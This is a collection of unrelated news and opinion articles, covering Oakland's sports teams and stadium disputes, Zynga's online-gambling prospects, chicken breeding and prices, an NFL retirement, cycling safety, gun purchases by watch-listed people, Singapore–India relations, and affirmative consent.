The $1.4 billion Chase Center is expected to open in San Francisco's Mission Bay neighborhood, just south of AT&T Park, in 2019, though that date could be pushed back as the team continues to fight through San Francisco's notorious bureaucratic red tape and the threat of legal action by a well-funding group that opposes the building.
There's a growing belief from Oakland fans that the Warriors won't leave in the next five years — a belief that the challenges in building an arena in San Francisco, even one that's privately financed, will prove too much, and they'll eventually build their basketball palace in Oakland — but that's unlikely to be the case.
Those inside the Warriors organization take to the company line when asked about the new arena's hangups. It's uniform, and a bit hubristic, but it's yet to be proven wrong: The Warriors want San Francisco desperately, and under this ownership group, headed by Joe Lacob and Peter Gruber, the Warriors get what they want.
The Oakland Raiders and A's don't have the money to build themselves new stadiums, and they can't go across the bay to tap into the more lucrative corporate marketplace of San Francisco while maintaining their current fanbases, like the Warriors plan to do.
On top of that, both the Raiders and A's have found Oakland to be less-than-responsive to their calls for new stadiums.
The Raiders, in particular, have found vocal opposition from city and county leaders, a fact that isn't unrelated to a clear lack of respect for team owner Mark Davis, who inherited the franchise when his father, Al, died 2011.
Neither the Raiders nor the city have presented a viable stadium plan to keep the team in Oakland, despite spending the entire decade discussing the subject.
Negotiations remain open, but frigid, and Davis has focused his attention on finding the Raiders a new market to call home.
Davis worked closely with San Diego Chargers owner Dean Spanos on a joint bid to move their teams to a publicly funded stadium in the Los Angeles suburb of Carson, but that bid fell apart when the NFL allowed the Rams to move to Los Angeles and gave the Chargers the right to share the Rams' new stadium in exchange for dropping the Carson plan.
Davis was left in the lurch — the mark of an elaborate scheme executed to perfection by the NFL's 31 other owners and their elected official, commissioner Roger Goodell.
It's hard to take Davis seriously. The haircut alone is enough to make one wonder, but he also drives a customized minivan, wears a fanny pack, uses the PF Chang's bar as his "office", and was a Tuesday regular at Hooters for all-you-can-eat wings until he was told by his doctor to eat better. Yet, through nothing but a birthright, this man in charge of a $1 billion NFL franchise.
The NFL did give Davis something for being the chump in its scheme to get a team (or two) to Los Angeles — the league is willing to pay $300 million to help build a new stadium in Oakland. It's a tremendous amount of money, but it's not nearly enough to build the Raiders a new stadium in the East Bay.
That's because Davis' income is directly tied to the team. He's worth a reported $500 million, but that's solely based on the valuation of the Raiders. He has no personal wealth to throw into building a new stadium.
The city of Oakland is in a slightly more flush situation, but they have no interest in giving tax dollars to a professional sports team, particularly one owned by Davis.
Oakland might be on the up, but the city still faces serious problems — public schools are among the worst in the state; crime, while decreasing, is still a major concern across the town; and the new wave of tech jobs and rapidly increasing property values has made affordable housing for longtime residents one of the city's most pressing issues. Oakland is not a rich city, and it's prioritized those issues over handing Davis the $400 million he said the city should pay for a new stadium.
The Raiders have looked into San Antonio — no go — San Diego, should the Chargers move — again, no go — and Las Vegas, where casino magnate Sheldon Adelson is keen to build a 65,000-seat domed arena.
"[Davis] has no idea what he's doing," Steven Tavares, who covers Oakland and Alameda County politics for his site, the East Bay Citizen, said. "He's waiting for someone to hold his hand on this thing."
Adelson might be that man who will hold Davis' hand, but there are massive hoops to jump through with financing — the Raiders have pledged to fund less than half the overall cost of the proposed $1.1 billion stadium in Las Vegas — and then there's that whole sports gambling thing, a big red flag for the NFL.
But the Raiders and Oakland are rarely talking these days. The city is entrenched in its stance that it won't publicly fund the stadium — if it were to spend money on a new facility, mayor Libby Schaaf has stated it'd be for the A's, which play 10 times as many home games per year — and the Raiders aren't capable or willing to foot the whole bill on a modern facility on par with the rest of the league.
The city is ready for the Raiders to follow the Warriors out of town. Oakland politicians have done the PR analysis, Tavares said, and while losing the team would hurt their standing with many in the community, taking a stand against public subsidies for an NFL team would play well — especially in an area this progressive.
"This is an uncommonly intelligent region, and many believe that a new stadium is exactly what we don't need," Tavares said. "They think they'll be a hero to other cities — chase 'em out the door. They think they'll be a hero to all local governments — ‘no, I'm breaking up with you.'"
Nothing can happen with the A's until the Raiders' situation is settled, and given Davis' inability to progress on his own, that might take a while.
The's have eyed a move to San Jose for the better part of a decade now. The city of San Jose even sued Major League Baseball to allow the team to move to the South Bay. In October, the U.S. Supreme Court refused to hear the city's appeal of a decision that upheld MLB's territorial rights rules.
The territorial rights put San Jose in Giants territory, making it off limits for the A's unless the Giants ceded the territory. The move to San Jose is off the table.
And now that the legal action has ceased, no one seems to have any idea what the A's will do.
Lew Wolff has been the public face of the A's ownership group, despite being a minority owner, but he's taken a backseat to majority owner John Fisher in recent weeks when it comes to the stadium. Fisher, the son of the founder of the Gap, owns 80 percent of the team but has been stingy with spending, despite a reported personal worth of $2.3 billion. It's unknown how much Fisher is willing to pay for a new ballpark.
The city and the Aare haven't reached a stage where money is being discussed. The two are still working to find an appropriate site, but until the Raiders make a move and the city can focus its entire attention on keeping the A's, the Coliseum will be home.
Should the Raiders continue to be in neutral, as is expected, the A's will reach an opportunity to break their lease before a new ballpark plan is reached. Would Montreal, Portland, or even, as commissioner Bob Manfred suggested last month, Mexico City prove better options?
The sound of jackhammers rings out in downtown Oakland as the sun rises. On one uptown block of Telegraph avenue, near Uber's soon-to-be offices, there are five different construction crews working on separate buildings and projects.
The Town can't keep up with the demand of people and businesses coming from across the bay and across the world to live in the town that has fairly earned a reputation as San Francisco's Brooklyn, with its vibrant culture and tight-knit sense of community.
The Warriors, Raiders, and A's are a big part of that sense of community. A part that could soon, much like the stadiums in East Oakland, be vacant.
BUSINESS
Earlier this month, the New York Post reported that Facebook game developer Zynga (ZNGA) was in talks with Wynn Resorts (WYNN) about a joint venture in the prospective US online gambling industry. The news did not appear to move the stock; ZNGA, in fact, fell 2% in that day's trading, to $12.22 per share.
Over the last two-plus weeks, Zynga's fall has accelerated; it closed Friday at $9.22. The reasons for the fall are difficult to parse; a secondary offering in late March, where shareholders sold an additional $515 million worth of shares into the market increased the stock's “float” and may have helped push the stock down. But with a young (the company only went public in December) and speculative (Zynga is not yet profitable) stock, the drivers of even large movements like the current one-month, 33% drop can be difficult to tease out.
For bulls touting ZNGA at its new, lower, price, the company's potential in online gambling has become a common selling point. Zynga's CEO Mark Pincus has called online gambling a “natural fit” for the company, noting that Zynga Poker is already the world's largest online poker provider. As my Seeking Alpha colleague “Modernist” argued, “Zynga incorporates tokens (like poker chips) within its games.” So, the theory goes, all Zynga has to do is wait for legalization, turn the “real-money gambling” switch on, and watch the profits roll in.
Unfortunately for Zynga shareholders, it ain't going to happen. There are entirely too many hurdles for Zynga to clear for it to reach any sort of market share in a US online gambling market that, ohbytheway, is still non-existent. For all the coverage of the late December re-interpretation of the Wire Act, there has been little real-world movement. New Jersey's bill has cleared a hurdle in the state Senate, but will likely face legal challenges from the state's racetracks. Nevada has begun the process of licensing online poker providers, with an eye toward having online poker up and running later this year. And that's it. The two states, combined, have a population of roughly 11 million, less than 4% of the total US population. In Nevada alone, fourteen different companies have applied for licenses to serve a market of less than 3 million people in a state that has traditional casinos (and traditional poker rooms) in nearly every major city, including the (perhaps former) gambling capital of the world. (And, no, neither Zynga nor Wynn are one of the fourteen applicants.)
If and when the US gambling market comes to fruition, there are still a host of challenges for Zynga. In the market – and in the business media in general – there seems to be an idea that any idiot can run a casino. As I noted back in February, casino stocks often see roughly similar valuations, no matter their target markets, customer base, or brand appeal. Since “the house always wins,” it's just a matter of getting people in the door and counting money.
This idea is patently untrue; just ask Donald Trump, whose casinos went bankrupt three separate times. Branding and the customer experience are key in the competition for the gambling dollar, a competition that will be exceptionally fierce in the potential US iGaming market. Nobody understands this better than Steve Wynn, whose properties are renowned for their opulence and attention to detail. As such, his flirtation with Zynga is particularly surprising. The Zynga brand is not, as yet, suited to the online gambling market. Its games like Farmville and Words with Friends don't conjure up the idea of thrilling, high-stakes, mental combat; they remind consumers of bored grandmothers and mid-level white-collar workers killing time at the office. Is a Zynga-branded poker game going to challenge an operation run by, say, the joint venture between Caesars Entertainment (CZR) and 888 Holdings? That joint venture will have the World Series of Poker imprint (through Caesars) and the technical and marketing expertise of 888, one of the few operators to see growing poker revenue in the mature European market. That JV will have a brand that appeals to poker players, and new potential customers; it will have the opportunity to offer WSOP seats in promotions, and cross-brand its online activities with live circuit events and its nationwide loyalty program. What will Zynga offer, free tokens for Mafia Wars? (One doubts that small-time poker players will create enough rake for free rooms at Wynn's $250 average daily rate.)
Furthermore, Zynga's social aspect is, in the poker arena, a negative, not a plus. I played online poker for several years pre-Black Friday; online poker players do not want to play with their friends. They want to take money from anonymous strangers, or at least have the opportunity to write “you f***ing donkey ur mother is a whore” in the chat box when they lose. Friends who want to play poker together meet at somebody's house with a case of beer and buy in for fifty or a hundred dollars a piece. Most online poker players – particularly the profitable ones – want to play for higher stakes, at multiple tables, on trustworthy, high-end software.
And there we get to yet another problem for Zynga: its software is, technically speaking, a piece of shit. The company has been repeatedly criticized for simply ripping off designs from smaller makers. Forbes gaming columnist Paul Tassi called Zynga “a creatively, and I would argue morally, bankrupt company.” Complaints about the bugs in the company's games are common; a long-time player told Tassi “they fix very few” of the game issues brought to their attention. Losing 50 tokens in Mafia Wars is one thing; but a bug in an online poker platform can cause severe damage to an operator's reputation – and its profits. The expertise needed to operate a gambling platform, particularly under the predicted state-by-state US regime, will be extensive. Age verification and geolocation software must be foolproof, as fines for serving out-of-state and/or underage customers will likely be severe. The software must be technically flawless; even an outage of a few hours – or God forbid, an opening for hackers to see hole cards and/or affect gameplay – will send players stampeding to competing sites. Nothing that Zynga has done should give investors any confidence that it will succeed on all these fronts.
It is true that that the arguments above against Zynga becoming a profitable iGaming company have focused on the poker market. Some have argued that Zynga could simply convert its existing games (such as bingo) to a real-money format, and reap its rewards there. Might the company also look to the UK and Europe – 35% of its revenue comes from overseas – where legalization regimes are already in place?
Well, no. First, the concept of US-based, US-regulated, legalized online platforms for games like bingo, blackjack and roulette is still a pipe dream. No legislator, any time soon, will dare sponsor such a bill, and eighteen months later face the inevitable nationally-hyped story about the 13-year-old who got his parents' credit card and blew $10,000 at a high-stakes online blackjack table. It doesn't matter whose fault such an event really is – even teenagers should know not to split kings – but the political risk of full iGaming legalization is so high that it seems nearly impossible in the current political climate. Even should such a regime come to be, the same issues facing Zynga in the poker market will face the company in other games. The company right now simply does not have the branding or the technical prowess to compete in what will surely be a highly competitive industry.
In Europe, that market is already well-covered, well-established, and slow-growing. Furthermore, the oft-cited potential of Zynga to move its users from free games to real-money ones has not materialized on the Continent. As Christian Tirabassi of Italy's Ficom Leisure told the recent iGaming North America Conference: the Facebook user “does not convert” to real-money games. The social game player is well aware of the existing real-money alternatives, and chooses not to take that risk. “I don't believe in the easy transition from social games to real [money] games,” Tirabassi told the audience.
Without the potential for real-money house games, Zynga is left with online poker, with a initial eye to the prospective US market. From there, all Zynga needs to become an online gambling powerhouse is to see poker legalization move at a faster pace than it has, or anyone thinks it will; completely overhaul its brand image and market to a demographic that has essentially no interest in its legacy games; complete a massive upgrade of its technical capabilities; and then outsmart competitors who have decades more experience in the gambling industry and partners who have already succeeded in the cutthroat European iGaming market.
Even then, without a full legalization of varied online games, what is the US poker market really worth? I've noted in the past that online poker had slowed dramatically in the US even before Black Friday; European operators are clawing one another's eyes out over the shrinking pool of “net depositors” (ie, losers). As Joe Brennan, director of the Interactive Media Entertainment and Gaming Association (IMEGA) noted in an interview, “[A]t the end of the day, poker is not a big business…In the long term, the only way you can be successful in the poker business is if you can dominate the market in terms of share.” To even consider entering the online gambling market, Zynga must travel a long road of massive changes, and substantial investments. To predict that this company with no gambling experience and substandard technical operations will become the market leader is simply a bridge too far.

This past weekend at Comic-Con 2016, Marvel Studios took the Hall H stage and did what they always do: own the room. The crowd went wild as Marvel unveiled the first footage from Spider-Man: Homecoming and Guardians of the Galaxy, Vol. 2, announced the star of Captain Marvel, and showed off new footage from Doctor Strange.
Shortly after the panel ended, Collider's own Steven Weintraub caught up with Marvel Studios president Kevin Feige backstage and spoke at length about a litany of upcoming projects. Feige discussed how 3D has been such an essential part of Doctor Strange that they're now struggling with making sure the visuals work in 2D, and he also gave a rundown of Marvel's slate as it stands now, including filming dates for Black Panther and Avengers: Infinity War and when we can expect to hear who's directing Captain Marvel (hint: by the end of the summer). Additionally, Feige discussed the prospect of Spider-Man: Homecoming sequels following the mold of Harry Potter and talked about the decision to use Baby Groot in Guardians of the Galaxy, Vol. 2.
You can read what Feige had to say about the 3D in Doctor Strange below, and watch the full video interview above.
(Reuters) - The world's largest chicken breeder has discovered that a key breed of rooster has a genetic issue that is reducing its fertility, adding to problems constraining U.S. poultry production and raising prices at a time when beef and pork prices are already at record highs.
Chickens walk in their enclosure on a farm in Maryland, in this file photo from October 19, 2005. REUTERS/Joshua Roberts/Files
The breed, Aviagen Group's standard Ross male, is sire through its offspring to as much as 25 percent of the nation's chickens raised for slaughter, said Aviagen spokeswoman Marla Robinson.
Sanderson Farms, the third-largest U.S. poultry producer and one of Aviagen's largest customers, said it and Aviagen systematically ruled out other possible causes for a decline in fertility before determining a genetic issue was at the root of the problem.
The issue is hitting an industry that is already suffering from a short supply of breeder birds.
The U.S. Agriculture Department last month reduced its U.S. chicken production forecast for 2014, predicting only a 1 percent increase in poundage from 2013, well below the long-run annual average of 4 percent. The agency predicted 2015 production would be up only 2.6 percent.
The limited growth in output is occurring as foreign demand for U.S. chicken is on the rise. U.S. exports of poultry for meat are projected to reach 3.4 million tons in 2014, up from 3.1 million last year.
SENSITIVE BIRD
Aviagen, owned privately by EW Group of Germany, provides breeding stock - hens and roosters - to Sanderson and other chicken producers, which then breed the birds and hatch their eggs to produce meat.
Sanderson last summer first identified an unusual reduction in chick output involving the Ross breed. Mike Cockrell, Sanderson's chief financial officer, said about 17 percent of eggs laid by Aviagen hens mated with the rooster breed failed to hatch. Typically, the failure rate is about 15 percent, he said.
Sanderson gradually eliminated a number of other potential factors, including the temperature in hatcheries and the source of corn fed to the birds, Cockrell said.
Aviagen sent a team of scientists to Sanderson last autumn to study the issue and has acknowledged that an undisclosed change it made to the breed's genetics made the birds “very sensitive” to being overfed, he said.
“We fed him too much. He got fat. When he got big, he did not breed as much as he was intended to,” Cockrell said about the breed of rooster. “The fertilization went way down, and our hatch has been way down.”
Aviagen regularly tweaks genetics in birds to improve them, Cockrell added.
Aviagen declined comment on changes to the rooster's genetics.
The chicken breeding company has replaced the breed suffering from fertility issues with a new breed, and is mating it with the same type of hens. It is too early to provide accurate projections for their productivity, but “results to date are favorable,” Robinson said.
Sanderson expects to fully shift to the replacement breed by autumn, Cockrell said.
REBUILDING EFFORT
The fertility problem is occurring at a time when the industry is dealing with a shortage of breeder birds, which are in demand as the sudden hike in beef and pork prices this year has renewed demand for chicken.
The shortfall came about after breeders reduced their flocks when a spike in feed prices in 2011 squeezed their profit margins, according to Sanderson and poultry experts. While grain prices have now fallen and demand for chicken is on the rise, U.S. poultry breeders are still rebuilding their flocks.
Aviagen's Robinson declined to comment on the reasons breeder birds are in tight supply. The nation's other major breeding company, Cobb Vantress, owned by Tyson Foods, declined to comment for this article.
A lack of accommodation for newly born breeder birds after the 2011 cutback is slowing the rebuilding process, said Paul Aho, a consultant to Aviagen and a poultry economist.
Constrained production has helped push chicken prices in Georgia, a key market, to record highs, analysts said. Boneless skinless breasts there recently were priced at $2.21 a pound, up 4.5 percent from a year earlier. The production shortfall is adding 50 cents per pound to the cost of chicken breasts, which sell for about $2.02 per pound in the northeastern United States, Aho said.
SCRAMBLING FOR EGGS
The high prices would normally spur chicken companies to increase production more than 5 percent from the prior year, had more breeder birds been available, said Bill Roenigk, a former senior vice president for the National Chicken Council.
In some cases, companies are trying to hatch eggs that would have been discarded in the past for being the wrong size or damaged, he said.
“Right now they're scrambling to really put any egg in the incubator that can be in the incubator, and they're paying a price in terms of not as good hatchability,” he said.
Chicken producers also are keeping their hens laying eggs longer than usual to compensate for the lack of new birds - as many as five weeks beyond their typical cut-off age of 65 weeks. Eggs from older hens tend to hatch at a lower rate.
JP Morgan in March said the number of eggs per laying hen fell below the 10-year average for the first time since 2010.
“They don't have enough of these breeder birds and they also don't have the quality that they would have had 10 years ago,” said Will Sawyer, vice president of food and agribusiness research for Rabobank.
There is no sign that the tight supply of breeder birds and drop in hatchability threatens human health.
SOARING PROFITS
High chicken prices due to the production constraints have helped push up the stock prices of Tyson and Sanderson this year, by about 17 percent and 38 percent, respectively. Both Tyson and Sanderson reported net income more than doubled in their fiscal second quarters.
The price increase is especially painful for consumers as prices for steaks and pork chops are up 10 percent this year due to drought and disease affecting herds.
“There's nothing cheap to buy,” said Ron Prestage, president-elect of the National Pork Producers Council.
Shawna McLean, who lives with her husband and dog in Playa Del Rey, California, said she now chooses meats based on what is on sale. “I'm looking at the same chicken and the price has gone up about $3 in the last month,” said the 48-year old, who is looking for a job.
The San Francisco 49ers announced on Sunday that running back Jarryd Hayne has retired from the National Football League.
“We would like to thank Jarryd for his contributions to the San Francisco 49ers organization and our community over the last year,” said 49ers general manager Trent Baalke. “Jarryd is a tremendous example of what can happen when you commit to a goal and do everything in your power to make it a reality. He earned the right to wear a 49ers uniform and compete alongside the best in the game. We fully support Jarryd's decision to pursue another dream - representing the Fiji Rugby Sevens team in this summer's Olympic games. We look forward to watching him in Rio and wish him continued success.”
<span style="text-decoration: underline;">Statement from Jarryd Hayne:</span>
“I'd like to thank Jed and the entire York family for giving me the opportunity to fulfill my dream of playing in the National Football League. I also want to thank Trent and his staff, as well as Jim Tomsula, Tom Rathman and the other coaches who invested in me to make this dream a reality. I'd also like to thank Coach Kelly for the opportunity to come back this year. The support and understanding from the 49ers organization was unbelievable when I let them know about my decision to pursue another dream. The past 12 months with the San Francisco 49ers have been absolutely incredible. I could not have predicted how far I have come as an NFL player. To not only be able to play in a game but also say that I started a game in the NFL is something that I will remember for a lifetime.
“I am retiring from the NFL because the Fiji Rugby Sevens team reached out to me about the opportunity to join the team for the upcoming Olympics, and I simply could not pass that chance up. The Olympics has been something I have admired since I was a little boy, and it is an opportunity I feel very similar to me joining the NFL.
“The 49ers organization has been incredibly supportive throughout my journey and I cannot thank them and the support staff enough. I am especially grateful to the strength and conditioning coaches, trainers and medical staff, equipment guys, public relations crew, chefs, logistics, and merchandise staff for their countless hours helping me in many different ways, so I could focus on football. Thank you to the fans from down under, as well as those around the world, who stood behind me and supported me along this amazing journey. I also want to thank the boys, especially my running back brothers, for their help and support in my transition to the NFL. I wish the team nothing but the best for the upcoming season.
“Last but not least, I would like to thank the 49ers Faithful for your unwavering support. From day one you have always been in my corner and I can't thank you enough for the love you've shown for the kid from down under. Signing off, your mate, number 38.”
Hayne (6-2, 220) originally signed with the 49ers as an undrafted free agent on March 3, 2015. He appeared in eight games (one start) last season and registered 17 carries for 52 yards along with six receptions for 27 yards. He also returned eight punts for 76 yards on special teams.
In the wake of the tragic death of Belgian rider Antoine Demoitié, one of the sport's biggest names has weighed in on the issue of rider safety. Marcel Kittel (Etixx-QuickStep) has penned an open letter on his Facebook page, outlining the dangers faced by professional riders and calling for improvements to racing conditions. An edited version of Kittel's open letter appears in full below.
With the death of Antoine Demoitié we reached a new and very sad low point in the history of cycling and safety. Many people say it's part of our job to take risks and that crashes are part of this sport. And I agree. But not completely.
Every rider that gets injured, because of a crash he is not responsible for, is one too many. There is a difference between riders crashing in the last hectic kilometres of a race, fighting for the right wheel before the sprint, and riders crashing because of unsafe road furniture, reckless driving of motorbikes or cars, extreme weather conditions and unsafe race routes.
When the peloton goes into a final or passes a crucial, decisive point of a race, then every rider knows it is potentially dangerous. We brake late before the last important corner, we fight for wheels, don't hesitate to go into a gap that might be too small, we even push each other away to hold or get a better position in the bunch – all that at high speed and not only our own physical and mental limit, but also at the limit of our tyres and brakes.
That risk is calculated and, I don't want to lie here, also one of the reasons why I love cycling. There is this action going on and it's a real fight for the win! It makes you proud when you win a race, come back to the bus and you talk with your teammates about how well it worked, how well you defended or conquered the position in the final that brought you the win in the end.
And you start to talk about those dangerous moments where you almost crashed but somehow you avoided the pile-up in front of you or you got you bike straight again after you almost lost it in a corner. The moments of adrenaline, the rush of speed and the victory as reward afterwards are one of the components that make our sport so interesting.
But in recent years it has become more and more obvious that cycling has an increasing problem with safety. Here's a little reminder from the last two seasons: Greg van Avermaet (San Sebastian), Peter Sagan (Vuelta a España), Taylor Phinney (US Road Nationals), Stig Broeckx (Kuurne-Brussels-Kuurne), Jesse Sergent (Tour of Flanders) and Jakob Fuglsang (Tour de France) have been all involved in a crash with a motorbike or neutral car. Peter Stetina (Vuelta al Pais Vasco), Tom Boonen (Abu Dhabi Tour) and Matt Brammeier (Tour of Utah) crashed because of an unsafe race route.
Many of them ended up in hospital with heavy, career-influencing injuries and had a long, painful rehabilitation ahead of them. But the crashes also influenced the outcome of the race – something that is not in the interest of anyone. Not the teams, race organiser, sponsors, media or the cycling fans at home.
And think about it: there are no winners in those situations. The rider is hurt. The car driver or motorbike rider has this lifelong burden of having injured a rider or worse. The races don't get a result that comes purely down to physical and tactical strength. Cycling as a sport, but also as means of transportation for everyone, will be associated with such tragic events.
It's clear: cycling's biggest problem was doping and this still has to be fought. But the safety issues that are obvious should get the same attention and priority as the fight for clean sport. Not only because lives can be lost but also because there wasn't much done until now.
The last major change was the Extreme Weather Protocol that was introduced this year. And before that, and only after the death of Andrei Kivilev, the UCI made helmets compulsory in 2003. But from that year until now, cycling has gone through a tremendous change. The globalisation of cycling has created many new races in countries around the world and the fight against doping shifted the focus of improvement more to a focus on training, equipment and nutrition.
Riders train harder, are more efficient and look for every improvement that is possible. We get the best support from our teams to be better and faster, our bike sponsors are striving for faster and lighter bikes, we are doing aerodynamic tests to be 0.5 seconds quicker over 10 kilometres, electronic shifting helps us to shift faster and since 2016, we are allowed to ride on disc brakes so we can brake later. That all leads to a situation where the peloton rides faster and takes more risks. Pressure is on everyone to perform and be in front.
It's part of this evolution process in modern cycling to improve not only the rider and bike but also the race course the peloton is racing on. It's necessary to set higher and better standards for professional bike races and that's not up to the riders but to the organisers and the UCI.
It's easy to say that the riders are doing the race and therefore have responsibility for it. But it's simply not true. There are so many things in a race that are beyond the control of a rider: dangerous finishes, all the other vehicles that follow the race, spectators and the weather, for example. The riders are busy enough with concentrating on the race and need to trust organisers and the rules that they will be guided safely by experienced people on carefully chosen roads.
We need to work together to keep this sport safe and give sense to the tragic death of Antoine Demoitie. It would be great if we can see some major changes and development out of a discussion over safety. We need to start talking openly about it now. That's what I expect from my governing body and rider association.
For starters it would be good to see more experienced, well-trained drivers in cars and on motorbikes, a yearly statistic that keeps track of crashes in races in order to see a positive or negative development, and more signs/flashing lights that indicate sharp corners or dangerous points.
Tomorrow at the start of the 3 Days of De Panne we will mourn the loss of Antoine and pay respect to him, his family and team after this horrible accident. We owe it to Antoine to do everything to never let that happen again.
After Omar Mateen murdered dozens of people at a gay nightclub in Orlando early Sunday morning, he immediately became Exhibit A in the case for banning gun sales to suspected terrorists. But such a policy would not have stopped Mateen, and it would deprive many innocent people of their constitutional rights without due process.
Federal officials say Mateen bought the weapons he used in the attack, a Sig Sauer MCX rifle and a Glock 17 pistol, at a local gun shop on June 4 and 5, respectively. He passed a background check, meaning he did not have a criminal or psychiatric record that legally disqualified him from owning a gun.
The day after the massacre, Senate Democrats argued that the gun sales could have been prevented by the Denying Firearms and Explosives to Dangerous Terrorists Act, a bill the Senate rejected last December. "If that legislation had been in effect," said Sen. Chuck Schumer (D-N.Y.), "it is very likely that the FBI would have been able to block the purchase of these two weapons."
The bill, introduced by Sen. Dianne Feinstein (D-Calif.), would authorize the attorney general to block a gun purchase by someone "appropriately suspected" of involvement in terrorism based on "a reasonable belief" that he "may" use the gun "in connection with terrorism." If Schumer is right that Mateen met those criteria when he bought his guns, that only shows how easy it would be to strip people of their Second Amendment rights under Feinstein's bill.
In 2013, the Los Angeles Times reports, Mateen, the son of Afghan immigrants, "was questioned by FBI agents after they were told he had made inflammatory comments that co-workers worried were sympathetic to terrorists." Nothing came of it: "The FBI agents determined that Mateen had not broken any laws and closed the investigation."
The following year, the Times says, the FBI interviewed Mateen again "because agents had learned he had contact with an American who later died in a suicide bombing in Syria." They "closed that investigation because they concluded the contacts with the suicide bomber had been minimal."
At that point, according to the Times, Mateen's name was removed from the FBI's so-called Terrorist Watchlist. It is hard to see how a man who was cleared twice by the FBI and was no longer on a watch list could have been "appropriately suspected" of involvement in terrorism, or even how the FBI would have noticed that he was buying a gun.
But it's true that Feinstein's bill makes it very hard to reverse such a determination. A would-be gun buyer who tried to get his Second Amendment rights back might not be able to see the evidence against him, and he would lose as long as the government could show it was more likely than not that the attorney general's decision met the statutory criteria. The upshot is that people could permanently lose the right to keep and bear arms based on nothing more than unsubstantiated suspicions.
The American Civil Liberties Union (ACLU), which estimates that the FBI's watch list includes more than 1 million names, describes it as a "virtually standardless" dragnet that "ensnares innocent people and encourages racial and religious profiling." Although the list is supposedly limited to people "reasonably suspected of being involved in terrorist activity," something like two-fifths have "no recognized terrorist group affiliation."
The presumptive presidential nominees of both major parties nevertheless think people on watch lists should not be allowed to buy guns. "If somebody is on a watch list," Donald Trump told ABC News last November, "I would keep them away, absolutely." Hillary Clinton dismisses constitutional concerns, saying, "If you are on that list and you believe you should not be on that list, we have a process to actually raise your objections."
But that process is stacked against people mistakenly linked to terrorism, who are forced to prove their innocence. Americans should not have to dispel secret suspicions before they can exercise their constitutional rights.

NEW DELHI: PM Narendra Modi may not be a scholar like Atal Bihari Vajpayee but he will be very good at implementing ideas and his vision for India, former Singapore PM Goh Chok Tong said on Wednesday.One of the senior-most Singapore politicians, Goh took over as PM from the legendary Lee Kuan Yew in 1990 and remained at the helm for 14 years. As India seeks assistance from Singapore for the PM's infrastructure push, Goh, currently emeritus senior minister, met Modi to discuss the Indian PM's “vision'' for India.“Vajpayee was like a scholar and shrewd in his policies,'' Goh said after his 45-minute meeting with Modi. “PM Modi did not come across as a scholar but he knows his subjects and he will get things done,'' he added.“Modi is a man of action, full of energy. He can get ideas implemented. There is a sense of purpose about the new government. There are great expectations from him and my only worry is that people may be impatient,'' Goh, who counts Modi as an old friend, said.While discussing Modi's smart city idea, Goh described India and China as two “huge wings'' which could lift the Asian economy. Goh gave a thumbs up to Modi's 100 smart cities project, drawing a parallel with Singapore's own experience with “liveable city''. He suggested though that the figure of 100 made it a daunting task and it may be important to leave some of the work to the states.“In Singapore, the focus was on having a liveable city with good transportation, harmony and power,'' he said, adding that Modi also told him that he planned to turn India into a manufacturing hub. Goh made a strong pitch for India to play a more significant role in Regional Comprehensive Economic Partnership, a proposed FTA between 10 Asean nations and six other countries including India. As many as four Indian CMs visited Singapore recently as the NDA government unveiled its “state focus'' on building business and cultural links with Singapore.Goh was accompanied by minister in the prime minister's office S Iswaran and minister of state for national development Desmond Lee. Iswaran described the Little India riots last year as an isolated incident and said law abiding foreign workers had nothing to fear in the country.India and Singapore will celebrate the 50th anniversary of diplomatic ties next year. The main event is expected to be exchange of state visits by Singapore's President Tony Tan to India and Indian President Pranab Mukherjee to Singapore in 2015. The celebrations will also feature a ‘Festival of Singapore' in India and the ‘Year of India' in Singapore.

In 2007 Helsinki faced an unprecedented wave of occupations. During that year almost ten buildings were squatted and multiple spaces of hundreds of square feet where held for several months. When the movement was already fading, they were able to maintain a lease for the social center Satama. How did the movement that was sparked by the eviction of Ungdomshuset organise and how did it eventually fall apart? What can we learn from that movement today? Journalist Mikael Brunila, who participated in the squattings, will take a look at these questions.

Yesterday, I shared the thoughts of a recent college grad who gave his reasons for abandoning affirmative consent. As he told it, women were more often frustrated by his deference than appreciative. He was most confounded by a woman who stopped his advances—he quickly listened—only to complain later that he wasn't more persistent. She was offering "token resistance," he thought, because while she wanted to hook up, she didn't want to be thought of as a slut. And while he didn't feel comfortable ignoring "token resistance," his perception of it helped sour him on affirmative consent. "One of my fondest sexual experiences started with making eye contact across a room, moved to a dance floor, and then to an empty bathroom," he offered by way of comparison. "Not a single word was ever spoken, because none had to be. We both knew and understood. I was a man and she was a woman, and we found ourselves drawn together in that beautiful way that men and women have been since a time immemorial, a time long before language was ever spoken."
That perspective is shared by an unknowable number of young men—enough, I think, that it represents an obstacle to spreading affirmative-consent culture. It also elicited some thought-provoking responses from other Atlantic readers.
One offered the young man insights gleaned from kink parties, arguing that what some regard as "natural" aspects of sexual culture are, upon reflection, not natural at all. Rather, they depend largely on the set of basic rules laid down:
I frequently attend kink parties whose rules prescribe affirmative consent for any physical contact. And the one thing I've never seen there is someone putting up token resistance and expecting it to be ignored. Everybody knows the rules, so somebody who says "hey, slow down" when they don't mean it—whether it's because of a reflex, or meant as flirtation (because yes, some people may do that), or any other reason—at least accepts that if they say no, they're responsible for having said it! This is not because everyone there is awesome or even well-intentioned; it's because saying "no" while meaning "yes" just won't work. Your letter writer seems to fall into the trap of thinking that sexual norms are "natural," and that laws have to fit existing norms. But there's also a "traffic laws" element to sexual norms; declaring how people should interpret certain actions sets the meaning of those actions, even if they didn't have that meaning before. "Token resistance" is a pretty dumb social norm for all kinds of reasons. You mention (as a possible response to the letter) that one might say some of the people who like it are rapists who appreciate the cover it gives them; while I think that's true, I also think there are plenty of women who expect to face social punishment if they don't follow this norm. My point is, those people are not going to necessarily go without sex if they live under affirmative-consent laws. They're going to say, "Hey, I guess if I say this, I'm not getting laid," and make their choice accordingly. (I think affirmative consent is a very good social norm but probably a terrible law. I hope I'm wrong about the second part.)
A female Stanford student posited that "token resistance" isn't a reason for men to abandon affirmative consent—it is a call to women to do their part to make it work:
